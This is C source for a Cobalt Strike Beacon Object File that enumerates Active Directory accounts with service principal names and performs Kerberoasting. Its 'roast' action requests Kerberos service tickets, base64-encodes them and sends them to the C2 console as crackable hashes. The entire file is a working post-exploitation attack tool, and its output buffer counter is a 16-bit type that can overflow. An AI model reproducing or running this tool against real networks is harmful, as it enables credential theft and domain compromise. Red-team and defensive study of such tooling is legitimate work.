#define SECURITY_WIN32 

#include <windows.h>
#include <activeds.h>
#include <dsgetdc.h>
#include <lm.h>
#include <security.h>
#include "spn.h"
#include "beacon.h"

#define BUF_SIZE 512
#define MAXTOKENSIZE 16000

// Expanded output buffer size to handle dense Active Directory query results gracefully
#ifndef INTERNAL_BUFSIZE
#define INTERNAL_BUFSIZE 65536
#endif

char* output_buffer = NULL;                 
WORD current_out_size = 0;          

static const IID IID_IADs = { 0xfd8256d0, 0xfd15, 0x11ce, { 0xab, 0xc4, 0x02, 0x60, 0x8c, 0x9e, 0x75, 0x53 } };
static const IID IID_IDirectorySearch = { 0x109ba8ec, 0x92f0, 0x11d0, { 0xa7, 0x90, 0x00, 0xc0, 0x4f, 0xd8, 0xd5, 0xa8 } };

// Initialize output buffer
int bof_start() {
    output_buffer = (char*)MSVCRT$calloc(INTERNAL_BUFSIZE, 1);
    current_out_size = 0;
    return (output_buffer != NULL);
}

// Flush and send collected data to Cobalt Strike console
void flush_output(BOOL done) {
    if (output_buffer && current_out_size > 0) {
        BeaconOutput(CALLBACK_OUTPUT, output_buffer, current_out_size);
        current_out_size = 0;
        MSVCRT$memset(output_buffer, 0, INTERNAL_BUFSIZE);
    }
    if (done && output_buffer) {
        MSVCRT$free(output_buffer);
        output_buffer = NULL;
    }
}

// Internal buffered printf equivalent with auto-flush mechanisms
void buffered_printf(const char* format, ...) {
    int formatted_size = 0;
    va_list args;

    if (!output_buffer) return;

    va_start(args, format);
    formatted_size = MSVCRT$vsnprintf(NULL, 0, format, args);
    va_end(args);

    if (formatted_size <= 0) return;

    char* scratch_buffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, formatted_size + 1);
    if (!scratch_buffer) return;

    va_start(args, format);
    MSVCRT$vsnprintf(scratch_buffer, formatted_size + 1, format, args);
    va_end(args);

    if (formatted_size + current_out_size < INTERNAL_BUFSIZE) {
        MSVCRT$memcpy(output_buffer + current_out_size, scratch_buffer, formatted_size);
        current_out_size += formatted_size;
    } else {
        char* current_location = scratch_buffer;
        int remaining_bytes = formatted_size;

        while (remaining_bytes > 0) {
            int chunk_size = INTERNAL_BUFSIZE - current_out_size;
            if (remaining_bytes < chunk_size) {
                chunk_size = remaining_bytes;
            }

            MSVCRT$memcpy(output_buffer + current_out_size, current_location, chunk_size);
            current_out_size += chunk_size;

            if (current_out_size == INTERNAL_BUFSIZE) {
                flush_output(FALSE);
            }

            current_location += chunk_size;
            remaining_bytes -= chunk_size;
        }
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, scratch_buffer);
}

void RequestTicket(LPCWSTR lpwSPN) {
    CredHandle hCredential;
    TimeStamp tsExpiry;
    LPSTR lpszB64Ticket = NULL;
    PBYTE pTicketBuf = NULL;

    SECURITY_STATUS Status = SECUR32$AcquireCredentialsHandleW(NULL, MICROSOFT_KERBEROS_NAME, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCredential, &tsExpiry);
    if (Status != SEC_E_OK) return;

    pTicketBuf = (PBYTE)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAXTOKENSIZE);
    if (!pTicketBuf) {
        SECUR32$FreeCredentialsHandle(&hCredential);
        return;
    }

    CtxtHandle hContext;
    SecBuffer secBuf = { MAXTOKENSIZE, SECBUFFER_TOKEN, pTicketBuf };
    SecBufferDesc secBufDesc = { SECBUFFER_VERSION, 1, &secBuf };
    ULONG ulCtxAttrs = 0;

    Status = SECUR32$InitializeSecurityContextW(&hCredential, NULL, (PSECURITY_STRING)lpwSPN, ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &hContext, &secBufDesc, &ulCtxAttrs, NULL);

    if (Status == SEC_I_CONTINUE_NEEDED || Status == SEC_E_OK) {
        DWORD dwSize = 0;
        CRYPT32$CryptBinaryToStringA((PBYTE)secBufDesc.pBuffers->pvBuffer, secBufDesc.pBuffers->cbBuffer, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwSize);
        lpszB64Ticket = (LPSTR)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
        CRYPT32$CryptBinaryToStringA((PBYTE)secBufDesc.pBuffers->pvBuffer, secBufDesc.pBuffers->cbBuffer, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, lpszB64Ticket, &dwSize);
        
        buffered_printf("[+] Hash acquired for SPN: %ls\n%hs\n", lpwSPN, lpszB64Ticket);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpszB64Ticket);
    }
    SECUR32$FreeCredentialsHandle(&hCredential);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pTicketBuf);
}

void EnumSPN(LPCWSTR lpwAccount, LPCWSTR lpwProtocol, LPCWSTR lpwDC) {
    HRESULT hr = S_OK;
    IADs* pRoot = NULL;
    IDirectorySearch* pSearch = NULL;
    VARIANT var;
    
    OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    WCHAR wcRootPath[BUF_SIZE];
    MSVCRT$swprintf_s(wcRootPath, BUF_SIZE, L"%ls%ls/rootDSE", lpwProtocol, lpwDC);
    
    hr = ACTIVEDS$ADsOpenObject(wcRootPath, NULL, NULL, ADS_SECURE_AUTHENTICATION, &IID_IADs, (void**)&pRoot);
    if (FAILED(hr)) {
        buffered_printf("[-] Connection failed to %ls (0x%08lx)\n", wcRootPath, hr);
        goto CleanUp;
    }

    OLEAUT32$VariantInit(&var);
    pRoot->lpVtbl->Get(pRoot, (BSTR)L"defaultNamingContext", &var);

    WCHAR wcPathName[BUF_SIZE];
    MSVCRT$swprintf_s(wcPathName, BUF_SIZE, L"%ls%ls/%ls", lpwProtocol, lpwDC, var.bstrVal);

    hr = ACTIVEDS$ADsOpenObject(wcPathName, NULL, NULL, ADS_SECURE_AUTHENTICATION, &IID_IDirectorySearch, (void**)&pSearch);
    if (FAILED(hr)) goto CleanUp;

    WCHAR wcFilter[BUF_SIZE];
    if (lpwAccount == NULL || MSVCRT$wcslen(lpwAccount) == 0) {
        MSVCRT$swprintf_s(wcFilter, BUF_SIZE, L"(&(objectClass=user)(servicePrincipalName=*))");
    } else {
        MSVCRT$swprintf_s(wcFilter, BUF_SIZE, L"(&(objectClass=user)(sAMAccountName=*%ls*)(servicePrincipalName=*))", lpwAccount);
    }

    ADS_SEARCH_HANDLE hSearch;
    hr = pSearch->lpVtbl->ExecuteSearch(pSearch, wcFilter, NULL, -1, &hSearch);
    
    if (SUCCEEDED(hr)) {
        while (pSearch->lpVtbl->GetNextRow(pSearch, hSearch) == S_OK) { 
            ADS_SEARCH_COLUMN colSam, colSpn;
            if (pSearch->lpVtbl->GetColumn(pSearch, hSearch, L"sAMAccountName", &colSam) == S_OK) {
                if (pSearch->lpVtbl->GetColumn(pSearch, hSearch, L"servicePrincipalName", &colSpn) == S_OK) {
                    for (DWORD i = 0; i < colSpn.dwNumValues; i++) {
                        // Using buffered_printf to concatenate strings cleanly in memory
                        buffered_printf("[*] Found: %ls -> SPN: %ls\n", 
                            colSam.pADsValues[0].CaseIgnoreString, 
                            colSpn.pADsValues[i].CaseIgnoreString);
                    }
                    pSearch->lpVtbl->FreeColumn(pSearch, &colSpn);
                }
                pSearch->lpVtbl->FreeColumn(pSearch, &colSam);
            }
        }
        pSearch->lpVtbl->CloseSearchHandle(pSearch, hSearch);
    }

CleanUp:
    if (pSearch) pSearch->lpVtbl->Release(pSearch);
    if (pRoot) pRoot->lpVtbl->Release(pRoot);
    OLEAUT32$VariantClear(&var);
    OLE32$CoUninitialize();
}

VOID go(IN PCHAR Args, IN ULONG Length) {
    datap parser;
    BeaconDataParse(&parser, Args, Length);

    LPCWSTR lpwAction = (WCHAR*)BeaconDataExtract(&parser, NULL);
    if (!lpwAction) {
        BeaconPrintf(CALLBACK_ERROR, "Usage:\n* spn enum <ldap|ldaps|gc> <target> <dc>\n* spn roast <target>");
        return;
    }

    // Allocate memory stream for the output text collection
    if (!bof_start()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to initialize internal output buffer.");
        return;
    }

    if (MSVCRT$_wcsicmp(lpwAction, L"enum") == 0) {
        LPCWSTR lpwProtocolIn = (WCHAR*)BeaconDataExtract(&parser, NULL);
        LPCWSTR lpwTarget     = (WCHAR*)BeaconDataExtract(&parser, NULL);
        LPCWSTR lpwDC         = (WCHAR*)BeaconDataExtract(&parser, NULL);

        if (!lpwProtocolIn || !lpwTarget || !lpwDC) {
            BeaconPrintf(CALLBACK_ERROR, "Usage: spn enum <ldap|ldaps|gc> <target> <dc>");
            flush_output(TRUE);
            return;
        }

        LPCWSTR lpwProtocol = L"LDAP://";
        if (MSVCRT$_wcsicmp(lpwProtocolIn, L"ldaps") == 0) lpwProtocol = L"LDAPS://";
        if (MSVCRT$_wcsicmp(lpwProtocolIn, L"gc") == 0)    lpwProtocol = L"GC://";

        if (MSVCRT$wcslen(lpwTarget) == 0) {
            buffered_printf("[*] Enumerating ALL accounts with SPNs on %ls via %ls\n", lpwDC, lpwProtocolIn);
        } else {
            buffered_printf("[*] Wildcard search for *%ls* on %ls via %ls\n", lpwTarget, lpwDC, lpwProtocolIn);
			buffered_printf("====================================================================\n\n");
        }
        
        EnumSPN(lpwTarget, lpwProtocol, lpwDC);
    } 
    else if (MSVCRT$_wcsicmp(lpwAction, L"roast") == 0) {
        LPCWSTR lpwTarget = (WCHAR*)BeaconDataExtract(&parser, NULL);

        if (!lpwTarget) {
            BeaconPrintf(CALLBACK_ERROR, "Usage: spn roast <target>");
            flush_output(TRUE);
            return;
        }

        buffered_printf("[*] Requesting context ticket for SPN: %ls\n", lpwTarget);
        RequestTicket(lpwTarget);
    } 
    else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown action. Use 'enum' or 'roast'.");
    }

    // Single flush operation transmits the collected database entries in one transmission frame
    flush_output(TRUE);
}